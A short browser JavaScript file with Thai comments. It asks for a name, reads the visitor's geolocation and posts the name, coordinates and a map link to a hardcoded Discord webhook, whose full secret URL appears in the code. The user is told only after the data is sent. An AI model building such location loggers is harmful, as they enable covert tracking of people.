document.getElementById('locateBtn').addEventListener('click', () => {
  const output = document.getElementById('output');
  const nameInput = document.getElementById('nameInput');
  const name = nameInput.value.trim();

  if (!name) {
    output.textContent = '⚠️ ใส่ชื่อก่อนน้า!';
    return;
  }

  if (!navigator.geolocation) {
    output.textContent = 'Geolocation not supported by your browser.';
    return;
  }

  output.textContent = 'Locating...';

  navigator.geolocation.getCurrentPosition(success, error);

  function success(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;

    output.innerHTML = `
      <strong>👤 Name:</strong> ${name}<br>
      <strong>Latitude:</strong> ${latitude}<br>
      <strong>Longitude:</strong> ${longitude}<br>
      <em>Data sent to Discord...</em>
    `;

    sendToDiscord(name, latitude, longitude); // ✅ ใส่ name ด้วย
  }

  function error() {
    output.textContent = 'ไม่สามารถเข้าถึงพิกัดได้ 😥';
  }
});

function sendToDiscord(name, lat, lng) {
  const webhookURL = "https://discord.com/api/webhooks/1391646097528717322/D3VW1hQsPPUiEFE9lTwhjfXaDyf2qLHaf9rWGPOSTcCEzaY1OuNNGdUyirbpimBPOlzI";

  const safeName = name.replace(/</g, "&lt;").replace(/>/g, "&gt;");

  const content = {
    content: `📥 **New Location Received**\n👤 Name: ${safeName}\n🌐 Lat: ${lat}\n🌐 Lng: ${lng}\n🗺️ https://maps.google.com/?q=${lat},${lng}`
  };

  fetch(webhookURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(content)
  })
  .then(() => {
    console.log("✅ ส่งเข้า Discord เรียบร้อยแล้ว!");
  })
  .catch((err) => {
    console.error("❌ Error ส่งเข้า Discord:", err);
  });
}
